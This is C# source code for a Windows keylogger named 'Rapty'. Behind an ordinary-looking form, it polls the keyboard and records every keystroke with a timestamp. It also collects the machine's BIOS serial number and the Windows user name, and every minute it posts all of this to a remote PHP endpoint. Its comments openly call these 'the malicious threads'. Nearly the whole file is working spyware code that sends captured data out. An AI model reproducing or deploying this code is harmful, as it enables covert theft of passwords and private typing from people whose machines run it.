using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Windows.Input;
using System.Net.Http;
using System.Threading;
using System.Management;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;

namespace Rapty
{
    static class Program
    {
        // Remote HTTP(S) host.
        static string host = "https://www.example.com/rapty.php";

        // Keys you want to detect. DO NOT INCLUDE Key.None.
        static Key[] loggedKeys = ((Key[])Enum.GetValues(typeof(Key))).Except(new List<Key>()
        {
            Key.None,
            Key.DeadCharProcessed,
            Key.LineFeed,
            Key.System
        }).ToArray();


        static List<Event> loggedEvents = new List<Event>();
        static object lock1 = new object();
        static string serial;
        static string user = WindowsIdentity.GetCurrent().Name;
        static int index = 0;
        static string random = Guid.NewGuid().ToString();
        static Key lastKey = Key.None;

        struct Event
        {
            public Key key;
            public DateTime time;

            public override string ToString()
            {
                return time.ToString() + '\t' + key;
            }
        }

        static void LogKey(Key key)
        {
            if (key != lastKey)
            {
                lastKey = key;
                lock (lock1)
                {
                    loggedEvents.Add(new Event()
                    {
                        key = key,
                        time = DateTime.UtcNow
                    });
                }
            }
        }

        static string StringifyEvents()
        {
            string retVal = "";
            lock (lock1)
            {
                for (int i = 0; i < loggedEvents.Count; i++)
                {
                    retVal += loggedEvents[i].ToString() + "\r\n";
                }
            }
            return retVal;
        }

        static HttpClient client = new HttpClient();

        static void SendToServer()
        {
            lock (lock1)
            {
                if (loggedEvents.Count > 0)
                {
                    string content = StringifyEvents();
                    Dictionary<string, string> values = new Dictionary<string, string>
                    {
                        { "serial", serial },
                        { "user", user },
                        { "content", content },
                        { "index", index++.ToString() },
                        { "random", random }
                    };
                    loggedEvents = new List<Event>();
                    client.PostAsync(host, new FormUrlEncodedContent(values));
                }
            }
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // We do not want two instances of the application to run the malicious threads, because the server would receive duplicated data and it would not be good.
            if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly().Location)).Count() == 1)
            {
                Thread t = new Thread(delegate ()
                {
                    for (;;)
                    {
                        Thread.Sleep(10);
                        bool onePressed = false;
                        for (int i = 0; !onePressed && i < loggedKeys.Length; i++)
                        {
                            if (Keyboard.IsKeyDown(loggedKeys[i]))
                            {
                                LogKey(loggedKeys[i]);
                                onePressed = true;
                            }
                        }
                        if (!onePressed)
                        {
                            lastKey = Key.None;
                        }
                    }
                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();

                new Thread(delegate ()
                {
                    serial = "";
                    try
                    {
                        foreach (ManagementBaseObject mbo in new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS").Get())
                        {
                            serial = mbo["SerialNumber"].ToString().Trim();
                        }
                    }
                    catch (Exception)
                    {
                        foreach (ManagementBaseObject mbo in new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_OperatingSystem").Get())
                        {
                            serial = mbo["SerialNumber"].ToString();
                        }
                    }
                    
                    for (;;)
                    {
                        // You may want to pick a shorter time when testing.
                        Thread.Sleep(60000);
                        SendToServer();
                    }
                }).Start();
            }

            // This line is moved to the bottom because it's blocking.
            Application.Run(new Form1());
        }
    }
}
